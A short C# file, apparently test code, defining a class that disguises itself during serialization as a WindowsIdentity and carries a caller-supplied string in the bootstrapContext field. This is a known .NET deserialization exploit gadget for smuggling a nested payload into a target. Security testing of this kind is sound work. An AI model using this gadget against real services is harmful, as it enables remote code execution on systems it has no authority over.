using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Security.Principal;

using System.Text;

namespace JsonTest
{
    [Serializable]
    public class WindowsIdentityTest : ISerializable
    {
        public WindowsIdentityTest(string strContent)
        {
            StrContent = strContent;
        }
        private string StrContent { get; }
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsIdentity));
            info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", StrContent);
        }

    }
}

